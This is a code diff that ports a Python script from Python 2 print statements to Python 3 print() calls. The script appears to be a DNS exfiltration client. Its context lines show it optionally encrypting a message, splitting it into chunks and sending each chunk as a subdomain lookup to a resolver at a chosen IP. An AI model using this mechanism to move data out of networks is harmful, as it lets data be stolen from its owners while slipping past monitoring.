@@ -44,11 +44,11 @@ def main(ip, port, file, identifier, xxd, secret):
     if secret:
         c = CryptString(secret)
         message = c.encode(message)
-        print '[INFO] Message is encypted with the secret'
+        print('[INFO] Message is encypted with the secret')
 
-    print '---START OF MESSAGE---'
-    print message
-    print '---END OF MESSAGE---'
+    print('---START OF MESSAGE---')
+    print(message)
+    print('---END OF MESSAGE---')
 
     # prepare the dns service
     my_resolver = dns.resolver.Resolver(configure=False)
@@ -67,7 +67,7 @@ def main(ip, port, file, identifier, xxd, secret):
 
             payload_to_send = payload + '.' + fake_domain
 
-            print '[INFO] Sending lookup for :', payload_to_send
+            print('[INFO] Sending lookup for :', payload_to_send)
             answer = my_resolver.query(payload_to_send, 'A')
             for res in answer:
                 pass
@@ -102,17 +102,17 @@ def main(ip, port, file, identifier, xxd, secret):
             else:
                 payload_to_send = str(iteration).rjust(4, '0') + payload + '.' + fake_domain
 
-            print '[INFO] Sending lookup for :', payload_to_send
+            print('[INFO] Sending lookup for :', payload_to_send)
             answer = my_resolver.query(payload_to_send, 'A')
             for res in answer:
                 if str(res) != '127.0.0.1':
-                    print '[WARNING] Hmm, didnt get 127.0.0.1 as the response. Maybe you are not really talking to', \
-                        ip, '. We got', res
+                    print('[WARNING] Hmm, didnt get 127.0.0.1 as the response. Maybe you are not really talking to', \
+                          ip, '. We got', res)
                 pass
 
             iteration += 1
 
-    print '[INFO] Message sent in', iteration, 'requests'
+    print('[INFO] Message sent in', iteration, 'requests')
 
 
 if __name__ == '__main__':
